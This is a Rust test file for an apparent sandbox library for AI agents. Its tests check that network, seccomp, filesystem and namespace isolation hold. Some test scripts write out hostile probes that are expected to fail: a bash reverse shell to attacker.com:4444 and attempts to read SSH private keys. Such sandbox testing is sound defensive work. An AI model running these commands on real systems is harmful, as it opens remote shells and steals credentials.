//! Security tests that verify each sandbox guarantee.
//!
//! Every test here uses the FULL sandbox (user_namespace, network namespace,
//! seccomp, etc.) so we're testing real isolation, not a weakened config.
//!
//! Run with: docker compose run --rm dev cargo test --test security_test

mod common;

use agentjail::{Jail, JailConfig, Network, SeccompLevel};
use std::fs;
use std::path::PathBuf;

fn setup(name: &str) -> (PathBuf, PathBuf) { common::setup("sec", name) }
fn cleanup(src: &PathBuf, out: &PathBuf) { common::cleanup(src, out) }
fn full_config(src: PathBuf, out: PathBuf) -> JailConfig { common::full_sandbox_config(src, out) }

// ---------------------------------------------------------------------------
// Network isolation tests
// ---------------------------------------------------------------------------

/// Network::None must block ALL external network access.
/// This verifies the critical fix: network namespace is created for all modes.
#[tokio::test]
async fn test_network_none_blocks_external() {
    let (src, out) = setup("net-none-ext");
    fs::write(
        src.join("t.sh"),
        "#!/bin/sh\ntimeout 2 bash -c 'echo x > /dev/tcp/8.8.8.8/53' 2>&1 && echo REACHABLE || echo BLOCKED\n",
    ).unwrap();

    let config = full_config(src.clone(), out.clone());
    let jail = Jail::new(config).unwrap();
    let r = jail.run("/bin/sh", &["/workspace/t.sh"]).await.unwrap();
    let stdout = String::from_utf8_lossy(&r.stdout);

    assert!(
        stdout.contains("BLOCKED"),
        "Network::None must block external connections, got: {stdout}"
    );
    assert!(
        !stdout.contains("REACHABLE"),
        "External network should be unreachable"
    );

    cleanup(&src, &out);
}

/// Network::None must also block DNS resolution.
#[tokio::test]
async fn test_network_none_blocks_dns() {
    let (src, out) = setup("net-none-dns");
    fs::write(
        src.join("t.sh"),
        "#!/bin/sh\ntimeout 2 bash -c 'echo x > /dev/tcp/1.1.1.1/53' 2>&1 && echo DNS_REACHABLE || echo DNS_BLOCKED\n",
    ).unwrap();

    let config = full_config(src.clone(), out.clone());
    let jail = Jail::new(config).unwrap();
    let r = jail.run("/bin/sh", &["/workspace/t.sh"]).await.unwrap();
    let stdout = String::from_utf8_lossy(&r.stdout);

    assert!(
        stdout.contains("DNS_BLOCKED"),
        "Network::None must block DNS, got: {stdout}"
    );

    cleanup(&src, &out);
}

/// Network::Loopback must allow localhost connections.
#[tokio::test]
async fn test_network_loopback_allows_localhost() {
    let (src, out) = setup("net-lo-local");
    // Start a listener on localhost, connect to it, verify it works.
    fs::write(
        src.join("t.sh"),
        concat!(
            "#!/bin/sh\n",
            "# Start a background listener\n",
            "python3 -c \"\n",
            "import socket, threading, sys\n",
            "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
            "s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n",
            "s.bind(('127.0.0.1', 18765))\n",
            "s.listen(1)\n",
            "def accept():\n",
            "    c, _ = s.accept()\n",
            "    c.send(b'LOOPBACK_OK')\n",
            "    c.close()\n",
            "    s.close()\n",
            "t = threading.Thread(target=accept)\n",
            "t.start()\n",
            "# Client connects\n",
            "import time; time.sleep(0.1)\n",
            "c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
            "c.connect(('127.0.0.1', 18765))\n",
            "data = c.recv(100)\n",
            "print(data.decode())\n",
            "c.close()\n",
            "t.join()\n",
            "\" 2>&1 || echo LOOPBACK_FAILED\n",
        ),
    ).unwrap();

    let mut config = full_config(src.clone(), out.clone());
    config.network = Network::Loopback;
    let jail = Jail::new(config).unwrap();
    let r = jail.run("/bin/sh", &["/workspace/t.sh"]).await.unwrap();
    let stdout = String::from_utf8_lossy(&r.stdout);

    assert!(
        stdout.contains("LOOPBACK_OK"),
        "Loopback mode must allow localhost, got stdout={:?} stderr={:?}",
        stdout.trim(),
        String::from_utf8_lossy(&r.stderr).trim()
    );

    cleanup(&src, &out);
}

/// Network::Loopback must still block external connections.
#[tokio::test]
async fn test_network_loopback_blocks_external() {
    let (src, out) = setup("net-lo-ext");
    fs::write(
        src.join("t.sh"),
        "#!/bin/sh\ntimeout 2 bash -c 'echo x > /dev/tcp/8.8.8.8/53' 2>&1 && echo REACHABLE || echo BLOCKED\n",
    ).unwrap();

    let mut config = full_config(src.clone(), out.clone());
    config.network = Network::Loopback;
    let jail = Jail::new(config).unwrap();
    let r = jail.run("/bin/sh", &["/workspace/t.sh"]).await.unwrap();
    let stdout = String::from_utf8_lossy(&r.stdout);

    assert!(
        stdout.contains("BLOCKED"),
        "Loopback mode must block external, got: {stdout}"
    );

    cleanup(&src, &out);
}

// ---------------------------------------------------------------------------
// Seccomp tests
// ---------------------------------------------------------------------------

/// SeccompLevel::Standard must block ptrace.
#[tokio::test]
async fn test_seccomp_standard_blocks_ptrace() {
    let (src, out) = setup("seccomp-ptrace");
    // strace will fail with EPERM if ptrace is blocked
    fs::write(
        src.join("t.sh"),
        "#!/bin/sh\nstrace -e trace=write echo test 2>&1 && echo PTRACE_OK || echo PTRACE_BLOCKED\n",
    ).unwrap();

    let config = full_config(src.clone(), out.clone());
    let jail = Jail::new(config).unwrap();
    let r = jail.run("/bin/sh", &["/workspace/t.sh"]).await.unwrap();
    let combined = format!(
        "{}{}",
        String::from_utf8_lossy(&r.stdout),
        String::from_utf8_lossy(&r.stderr)
    );

    // strace should fail: either "Operation not permitted" or command not found
    assert!(
        combined.contains("PTRACE_BLOCKED")
            || combined.contains("Operation not permitted")
            || combined.contains("not found"),
        "Seccomp Standard should block ptrace, got: {combined}"
    );

    cleanup(&src, &out);
}

/// SeccompLevel::Strict must block socket creation (our fix).
#[tokio::test]
async fn test_seccomp_strict_blocks_sockets() {
    let (src, out) = setup("seccomp-strict-sock");
    fs::write(
        src.join("t.sh"),
        concat!(
            "#!/bin/sh\n",
            "python3 -c \"\n",
            "import socket, sys\n",
            "try:\n",
            "    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
            "    print('SOCKET_CREATED')\n",
            "    s.close()\n",
            "except OSError as e:\n",
            "    print('SOCKET_BLOCKED: ' + str(e))\n",
            "\" 2>&1\n",
        ),
    ).unwrap();

    let mut config = full_config(src.clone(), out.clone());
    config.seccomp = SeccompLevel::Strict;
    let jail = Jail::new(config).unwrap();
    let r = jail.run("/bin/sh", &["/workspace/t.sh"]).await.unwrap();
    let stdout = String::from_utf8_lossy(&r.stdout);

    assert!(
        stdout.contains("SOCKET_BLOCKED"),
        "Strict seccomp must block socket(), got: {stdout}"
    );
    assert!(
        !stdout.contains("SOCKET_CREATED"),
        "Socket should not be creatable under Strict"
    );

    cleanup(&src, &out);
}

/// SeccompLevel::Standard must ALLOW socket creation (only Strict blocks it).
#[tokio::test]
async fn test_seccomp_standard_allows_sockets() {
    let (src, out) = setup("seccomp-std-sock");
    fs::write(
        src.join("t.sh"),
        concat!(
            "#!/bin/sh\n",
            "python3 -c \"\n",
            "import socket\n",
            "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
            "print('SOCKET_CREATED')\n",
            "s.close()\n",
            "\" 2>&1\n",
        ),
    ).unwrap();

    let config = full_config(src.clone(), out.clone());
    let jail = Jail::new(config).unwrap();
    let r = jail.run("/bin/sh", &["/workspace/t.sh"]).await.unwrap();
    let stdout = String::from_utf8_lossy(&r.stdout);

    assert!(
        stdout.contains("SOCKET_CREATED"),
        "Standard seccomp should allow sockets, got stdout={:?} stderr={:?}",
        stdout.trim(),
        String::from_utf8_lossy(&r.stderr).trim()
    );

    cleanup(&src, &out);
}

// ---------------------------------------------------------------------------
// Filesystem tests
// ---------------------------------------------------------------------------

/// /dev/null must be writable (programs redirect to it).
#[tokio::test]
async fn test_dev_null_writable() {
    let (src, out) = setup("dev-null-w");
    fs::write(
        src.join("t.sh"),
        "#!/bin/sh\necho test > /dev/null 2>&1 && echo WRITE_OK || echo WRITE_BLOCKED\n",
    ).unwrap();

    let config = full_config(src.clone(), out.clone());
    let jail = Jail::new(config).unwrap();
    let r = jail.run("/bin/sh", &["/workspace/t.sh"]).await.unwrap();
    let stdout = String::from_utf8_lossy(&r.stdout);

    assert!(
        stdout.contains("WRITE_OK"),
        "/dev/null must be writable, got: {stdout}"
    );

    cleanup(&src, &out);
}

/// /dev/urandom must be readable.
#[tokio::test]
async fn test_dev_urandom_readable() {
    let (src, out) = setup("dev-urand-r");
    fs::write(
        src.join("t.sh"),
        "#!/bin/sh\nhead -c 4 /dev/urandom | wc -c | tr -d ' ' 2>&1\n",
    ).unwrap();

    let config = full_config(src.clone(), out.clone());
    let jail = Jail::new(config).unwrap();
    let r = jail.run("/bin/sh", &["/workspace/t.sh"]).await.unwrap();
    let stdout = String::from_utf8_lossy(&r.stdout);

    assert_eq!(
        stdout.trim(),
        "4",
        "/dev/urandom must be readable, got stdout={:?} stderr={:?}",
        stdout.trim(),
        String::from_utf8_lossy(&r.stderr).trim()
    );

    cleanup(&src, &out);
}

/// /dev/urandom must NOT be writable (our fix).
/// Skipped when running as root: root bypasses VFS read-only with CAP_DAC_OVERRIDE.
/// In production (user_namespace=true, non-root), the RDONLY mount is enforced.
#[tokio::test]
async fn test_dev_urandom_not_writable() {
    if common::is_root() {
        eprintln!("SKIP: root bypasses RDONLY mount on device nodes (test valid only for non-root)");
        return;
    }

    let (src, out) = setup("dev-urand-w");
    fs::write(
        src.join("t.sh"),
        "#!/bin/sh\necho test > /dev/urandom 2>&1 && echo WRITE_OK || echo WRITE_BLOCKED\n",
    ).unwrap();

    let config = full_config(src.clone(), out.clone());
    let jail = Jail::new(config).unwrap();
    let r = jail.run("/bin/sh", &["/workspace/t.sh"]).await.unwrap();
    let stdout = String::from_utf8_lossy(&r.stdout);

    assert!(
        stdout.contains("WRITE_BLOCKED"),
        "/dev/urandom should be read-only, got: {stdout}"
    );

    cleanup(&src, &out);
}

/// /dev/zero must NOT be writable (our fix).
/// Skipped when running as root: root bypasses VFS read-only with CAP_DAC_OVERRIDE.
#[tokio::test]
async fn test_dev_zero_not_writable() {
    if common::is_root() {
        eprintln!("SKIP: root bypasses RDONLY mount on device nodes (test valid only for non-root)");
        return;
    }

    let (src, out) = setup("dev-zero-w");
    fs::write(
        src.join("t.sh"),
        "#!/bin/sh\necho test > /dev/zero 2>&1 && echo WRITE_OK || echo WRITE_BLOCKED\n",
    ).unwrap();

    let config = full_config(src.clone(), out.clone());
    let jail = Jail::new(config).unwrap();
    let r = jail.run("/bin/sh", &["/workspace/t.sh"]).await.unwrap();
    let stdout = String::from_utf8_lossy(&r.stdout);

    assert!(
        stdout.contains("WRITE_BLOCKED"),
        "/dev/zero should be read-only, got: {stdout}"
    );

    cleanup(&src, &out);
}

/// Workspace must be read-only (full sandbox).
#[tokio::test]
async fn test_workspace_readonly_full_sandbox() {
    let (src, out) = setup("ws-ro");
    fs::write(
        src.join("t.sh"),
        "#!/bin/sh\necho pwned > /workspace/hack.txt 2>&1 && echo WRITE_OK || echo WRITE_BLOCKED\n",
    ).unwrap();

    let config = full_config(src.clone(), out.clone());
    let jail = Jail::new(config).unwrap();
    let r = jail.run("/bin/sh", &["/workspace/t.sh"]).await.unwrap();
    let stdout = String::from_utf8_lossy(&r.stdout);

    assert!(
        stdout.contains("WRITE_BLOCKED"),
        "Workspace must be read-only, got: {stdout}"
    );
    // Verify no file was actually written on host
    assert!(!src.join("hack.txt").exists(), "File should not exist on host");

    cleanup(&src, &out);
}

/// Output dir must be writable (full sandbox).
#[tokio::test]
async fn test_output_writable_full_sandbox() {
    let (src, out) = setup("out-rw");
    fs::write(
        src.join("t.sh"),
        "#!/bin/sh\necho artifact > /output/result.txt && echo WRITE_OK || echo WRITE_FAILED\n",
    ).unwrap();

    let config = full_config(src.clone(), out.clone());
    let jail = Jail::new(config).unwrap();
    let r = jail.run("/bin/sh", &["/workspace/t.sh"]).await.unwrap();
    let stdout = String::from_utf8_lossy(&r.stdout);

    assert!(
        stdout.contains("WRITE_OK"),
        "Output dir must be writable, got: {stdout}"
    );
    assert!(
        out.join("result.txt").exists(),
        "Artifact must appear on host"
    );

    cleanup(&src, &out);
}

// ---------------------------------------------------------------------------
// PID namespace test (full sandbox)
// ---------------------------------------------------------------------------

/// Process must be PID 1 inside the jail.
#[tokio::test]
async fn test_pid_namespace_full_sandbox() {
    let (src, out) = setup("pid-ns");
    fs::write(
        src.join("t.sh"),
        "#!/bin/sh\necho PID=$$\n",
    ).unwrap();

    let config = full_config(src.clone(), out.clone());
    let jail = Jail::new(config).unwrap();
    let r = jail.run("/bin/sh", &["/workspace/t.sh"]).await.unwrap();
    let stdout = String::from_utf8_lossy(&r.stdout);

    assert!(
        stdout.contains("PID=1"),
        "Must be PID 1 in namespace, got: {stdout}"
    );

    cleanup(&src, &out);
}

// ---------------------------------------------------------------------------
// Chroot escape tests (full sandbox)
// ---------------------------------------------------------------------------

/// Must not be able to read host /home directory.
#[tokio::test]
async fn test_chroot_no_home() {
    let (src, out) = setup("chroot-home");
    fs::write(
        src.join("t.sh"),
        "#!/bin/sh\nls /home 2>&1 && echo HOME_VISIBLE || echo HOME_BLOCKED\n",
    ).unwrap();

    let config = full_config(src.clone(), out.clone());
    let jail = Jail::new(config).unwrap();
    let r = jail.run("/bin/sh", &["/workspace/t.sh"]).await.unwrap();
    let stdout = String::from_utf8_lossy(&r.stdout);

    assert!(
        stdout.contains("HOME_BLOCKED"),
        "/home should not exist in jail, got: {stdout}"
    );

    cleanup(&src, &out);
}

/// Must not be able to read host /var directory.
#[tokio::test]
async fn test_chroot_no_var() {
    let (src, out) = setup("chroot-var");
    fs::write(
        src.join("t.sh"),
        "#!/bin/sh\nls /var 2>&1 && echo VAR_VISIBLE || echo VAR_BLOCKED\n",
    ).unwrap();

    let config = full_config(src.clone(), out.clone());
    let jail = Jail::new(config).unwrap();
    let r = jail.run("/bin/sh", &["/workspace/t.sh"]).await.unwrap();
    let stdout = String::from_utf8_lossy(&r.stdout);

    assert!(
        stdout.contains("VAR_BLOCKED"),
        "/var should not exist in jail, got: {stdout}"
    );

    cleanup(&src, &out);
}

/// Must not be able to read SSH keys.
#[tokio::test]
async fn test_cannot_read_ssh_keys() {
    let (src, out) = setup("ssh-keys");
    fs::write(
        src.join("t.sh"),
        "#!/bin/sh\ncat ~/.ssh/id_rsa 2>&1 && echo SSH_LEAKED || echo SSH_BLOCKED\ncat /root/.ssh/id_rsa 2>&1 && echo SSH_LEAKED || echo SSH_BLOCKED\n",
    ).unwrap();

    let config = full_config(src.clone(), out.clone());
    let jail = Jail::new(config).unwrap();
    let r = jail.run("/bin/sh", &["/workspace/t.sh"]).await.unwrap();
    let stdout = String::from_utf8_lossy(&r.stdout);

    assert!(
        !stdout.contains("SSH_LEAKED"),
        "SSH keys must not be readable, got: {stdout}"
    );

    cleanup(&src, &out);
}

// ---------------------------------------------------------------------------
// Allowlist proxy integration tests
// ---------------------------------------------------------------------------

/// Network::Allowlist with empty list must block all outbound traffic.
#[tokio::test]
async fn test_allowlist_empty_blocks_all() {
    let (src, out) = setup("al-empty");
    fs::write(
        src.join("t.sh"),
        "#!/bin/sh\ntimeout 5 bash -c 'echo x > /dev/tcp/8.8.8.8/53' 2>&1 && echo REACHABLE || echo BLOCKED\n",
    ).unwrap();

    let mut config = full_config(src.clone(), out.clone());
    config.network = Network::Allowlist(vec![]);
    let jail = Jail::new(config).unwrap();
    let r = jail.run("/bin/sh", &["/workspace/t.sh"]).await.unwrap();
    let stdout = String::from_utf8_lossy(&r.stdout);

    assert!(
        stdout.contains("BLOCKED"),
        "Empty allowlist must block all traffic, got: {stdout}"
    );

    cleanup(&src, &out);
}

/// Network::Allowlist must allow npm install when registry domains are allowlisted.
///
/// Sets up a tiny Node project with a single small dependency (is-number)
/// and verifies `npm install` succeeds through the proxy.
/// Workspace is read-only, so we copy to /output and install there.
#[tokio::test]
async fn test_allowlist_npm_install_allowed() {
    let (src, out) = setup("al-npm-ok");

    // Minimal package.json with a tiny dep
    fs::write(
        src.join("package.json"),
        r#"{"name":"test","version":"1.0.0","dependencies":{"is-number":"7.0.0"}}"#,
    ).unwrap();

    // Copy to writable /output, then npm install there
    fs::write(
        src.join("t.sh"),
        concat!(
            "#!/bin/sh\n",
            "cp /workspace/package.json /output/package.json\n",
            "cd /output\n",
            "npm install --prefer-online 2>&1\n",
            "if [ -d /output/node_modules/is-number ]; then\n",
            "  echo NPM_INSTALL_OK\n",
            "else\n",
            "  echo NPM_INSTALL_FAILED\n",
            "fi\n",
        ),
    ).unwrap();

    let mut config = full_config(src.clone(), out.clone());
    config.network = Network::Allowlist(vec![
        "registry.npmjs.org".into(),
        "*.npmjs.org".into(),
    ]);
    config.timeout_secs = 60;
    let jail = Jail::new(config).unwrap();
    let r = jail.run("/bin/sh", &["/workspace/t.sh"]).await.unwrap();
    let stdout = String::from_utf8_lossy(&r.stdout);
    let stderr = String::from_utf8_lossy(&r.stderr);

    assert!(
        stdout.contains("NPM_INSTALL_OK"),
        "npm install should succeed with registry allowlisted, stdout={:?} stderr={:?}",
        stdout.trim(),
        stderr.trim()
    );

    cleanup(&src, &out);
}

/// Network::Allowlist must block npm install when registry is NOT in the allowlist.
#[tokio::test]
async fn test_allowlist_npm_install_blocked() {
    let (src, out) = setup("al-npm-no");

    fs::write(
        src.join("package.json"),
        r#"{"name":"test","version":"1.0.0","dependencies":{"is-number":"7.0.0"}}"#,
    ).unwrap();

    fs::write(
        src.join("t.sh"),
        concat!(
            "#!/bin/sh\n",
            "cp /workspace/package.json /output/package.json\n",
            "cd /output\n",
            "npm install --prefer-online 2>&1\n",
            "if [ -d /output/node_modules/is-number ]; then\n",
            "  echo NPM_INSTALL_OK\n",
            "else\n",
            "  echo NPM_INSTALL_BLOCKED\n",
            "fi\n",
        ),
    ).unwrap();

    let mut config = full_config(src.clone(), out.clone());
    // Only allow a domain that isn't the npm registry
    config.network = Network::Allowlist(vec!["api.anthropic.com".into()]);
    config.timeout_secs = 30;
    let jail = Jail::new(config).unwrap();
    let r = jail.run("/bin/sh", &["/workspace/t.sh"]).await.unwrap();
    let stdout = String::from_utf8_lossy(&r.stdout);

    assert!(
        stdout.contains("NPM_INSTALL_BLOCKED"),
        "npm install should fail when registry not in allowlist, got: {stdout}"
    );

    cleanup(&src, &out);
}

/// Reverse shell must fail (no network + even loopback external blocked).
#[tokio::test]
async fn test_reverse_shell_blocked() {
    let (src, out) = setup("rev-shell");
    fs::write(
        src.join("t.sh"),
        "#!/bin/sh\nbash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' 2>&1 && echo SHELL_OK || echo SHELL_BLOCKED\n",
    ).unwrap();

    let config = full_config(src.clone(), out.clone());
    let jail = Jail::new(config).unwrap();
    let r = jail.run("/bin/sh", &["/workspace/t.sh"]).await.unwrap();
    let stdout = String::from_utf8_lossy(&r.stdout);

    assert!(
        stdout.contains("SHELL_BLOCKED"),
        "Reverse shell must fail, got: {stdout}"
    );

    cleanup(&src, &out);
}
